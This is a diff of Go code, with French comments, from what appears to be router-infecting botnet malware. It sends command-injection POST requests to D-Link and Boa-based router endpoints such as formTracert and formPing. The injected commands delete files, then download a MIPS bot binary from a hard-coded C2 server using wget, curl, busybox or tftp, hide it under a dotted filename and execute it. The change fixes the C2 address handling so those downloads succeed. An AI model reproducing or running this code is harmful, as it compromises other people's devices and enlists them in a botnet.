@@ -40,7 +40,7 @@ func exploitDlinkRCE(target string, c2Server string, hideName string, malwarePat
 
 	// Construire la commande d'exploitation
 	exploitCmd := fmt.Sprintf("command=wget http://%s%s -O /tmp/.%s && chmod 777 /tmp/.%s && /tmp/.%s mips &", 
-		c2Server, malwarePath, hideName, hideName, hideName)
+		c2ServerIP, malwarePath, hideName, hideName, hideName)
 	
 	// Envoyer la requête pour exploiter la vulnérabilité
 	httpRequest := fmt.Sprintf("POST /apply.cgi HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s\r\n\r\n",
@@ -126,8 +126,10 @@ func sendExploit(target string) int {
 		"telnetd",
 	}
 
-	// Serveur C2
-	c2Server := "51.68.128.169:1337"
+	// Serveur C2 - séparer l'adresse IP et le port pour les commandes wget/curl
+	c2ServerIP := "51.68.128.169"
+	c2ServerPort := "1337"
+	c2Server := c2ServerIP + ":" + c2ServerPort
 	
 	// Chemins d'installation alternatifs
 	installPaths := []string{
@@ -156,7 +158,7 @@ func sendExploit(target string) int {
 			
 			// Construire la commande d'exploitation avec wget et nom caché
 			exploitCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bwget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
-				installPath, hideName, c2Server, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
+				installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
 			
 			// Envoyer la requête pour notre serveur C2
 			httpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
@@ -170,7 +172,7 @@ func sendExploit(target string) int {
 			conn2, err := net.DialTimeout("tcp", target, 10 * time.Second)
 			if err == nil {
 				curlCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bcurl%%20http://%s%s%%20-o%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
-					installPath, hideName, c2Server, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
+					installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
 				
 				curlRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
 					target, len(curlCmd)+29, target, target, curlCmd)
@@ -184,7 +186,7 @@ func sendExploit(target string) int {
 			conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
 			if err == nil {
 				busyboxCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Bbusybox%%20wget%%20http://%s%s%%20-O%%20%s/.%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20%s%%20&", 
-					installPath, hideName, c2Server, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
+					installPath, hideName, c2ServerIP, malware.path, installPath, hideName, installPath, hideName, installPath, hideName, malware.args)
 				
 				busyboxRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
 					target, len(busyboxCmd)+29, target, target, busyboxCmd)
@@ -215,7 +217,7 @@ func sendExploit(target string) int {
 		conn3, err := net.DialTimeout("tcp", target, 10 * time.Second)
 		if err == nil {
 			tftpCmd := fmt.Sprintf("target_addr=%%3Brm%%20-rf%%20%s/.%s%%3Btftp%%20-g%%20-r%%20bot.mips%%20%s%%3Bchmod%%20777%%20%s/.%s%%3B%s/.%s%%20mips%%20&", 
-				installPath, hideName, c2Server, installPath, hideName, installPath, hideName)
+				installPath, hideName, c2ServerIP, installPath, hideName, installPath, hideName)
 			tftpRequest := fmt.Sprintf("POST /boaform/admin/formTracert HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_tracert_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s&waninf=1_INTERNET_R_VID_\r\n\r\n",
 				target, len(tftpCmd)+29, target, target, tftpCmd)
 
@@ -230,7 +232,7 @@ func sendExploit(target string) int {
 	if err == nil {
 		hideName := hideNames[rand.Intn(len(hideNames))]
 		pingCmd := fmt.Sprintf("ping_addr=127.0.0.1;wget%%20http://%s/bot.mips%%20-O%%20/tmp/.%s;chmod%%20777%%20/tmp/.%s;/tmp/.%s%%20mips%%20&", 
-			c2Server, hideName, hideName, hideName)
+			c2ServerIP, hideName, hideName, hideName)
 		pingRequest := fmt.Sprintf("POST /boaform/admin/formPing HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nOrigin: http://%s\r\nConnection: close\r\nReferer: http://%s/diag_ping_admin_en.asp\r\nUpgrade-Insecure-Requests: 1\r\n\r\n%s\r\n\r\n",
 			target, len(pingCmd), target, target, pingCmd)
 
